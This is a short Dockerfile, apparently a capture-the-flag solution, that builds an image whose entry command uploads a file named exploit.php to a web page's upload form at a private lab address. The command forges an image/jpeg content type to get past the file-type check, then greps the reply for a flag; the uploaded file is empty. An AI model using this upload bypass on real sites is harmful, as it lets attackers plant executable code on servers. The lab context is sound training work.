FROM ubuntu:latest

RUN apt-get update && apt-get install -y curl grep

RUN touch exploit.php

ENTRYPOINT /bin/bash -c "curl -X 'POST' \
-F 'uploaded=@"exploit.php";type=image/jpeg' \
-F 'Upload="Upload"' \
'http://192.168.1.16/?page=upload' \
| grep 'flag'"